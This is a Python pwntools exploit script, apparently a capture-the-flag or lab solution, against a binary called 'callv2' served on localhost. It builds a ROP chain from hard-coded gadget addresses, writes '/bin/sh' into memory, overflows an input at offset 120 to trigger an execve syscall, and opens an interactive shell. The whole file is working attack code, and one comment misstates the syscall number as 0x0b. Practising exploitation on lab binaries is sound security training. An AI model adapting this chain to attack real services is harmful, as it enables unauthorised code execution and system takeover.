from pwn import *
context.arch = 'amd64'

binary = ELF('./callv2')
# p = process(binary.path)
p = remote("localhost", 5056)

# p: process = gdb.debug(binary.path,'''
#     b main
#     c
# ''')

# Init ROP Chain Vals
# 1: other vals
shcode: bytes = b'/bin/sh\x00'
shcode_ptr = 0x404000

syscall: int = 0x401208

# 2: end goal vals
RAX: int = 0x3b
RDI: int = shcode_ptr
RSI: int = 0
RDX: int = 0

# 3: gadgets
pop_rax = 0x4011fe                  # pop rax ; ret
xchg_rax_rdi = 0x401200             # xchg rax, rdi ; ret
pop_rsi = 0x401203                  # pop rsi ; ret
mov_rsi_rdi_ptr = 0x40120b          # mov [rdi], rsi ; ret
push_rax_pop_rdx = 0x401224         # push rax ; pop rdx ; ret

# Creating ROP Chain
rop = ROP(binary)

# Task 1: Store "/bin/sh\x00" at shcode_ptr
rop.raw([
    pop_rax, shcode_ptr,  # RAX = shcode_ptr
    xchg_rax_rdi,         # RDI = shcode_ptr
    pop_rsi, shcode,      # RSI = "/bin/sh\x00"
    mov_rsi_rdi_ptr       # Store RSI at [RDI]
])

# Task 2: Set up execve syscall
rop.raw([
    pop_rax, RAX,         # RAX = 0x3b (execve)
    pop_rsi, RSI,         # RSI = 0
    pop_rax, 0,           # RAX = 0
    push_rax_pop_rdx,     # RDX = 0
    pop_rax, RAX,         # RAX = 0x0b again
    syscall               # Execute syscall
])

offset = 120

payload = fit({
    offset: rop.chain()
})

# Send entire payload
p.sendline(b'1')
p.recvuntil(b'feedback:')
p.sendline(payload)
p.interactive()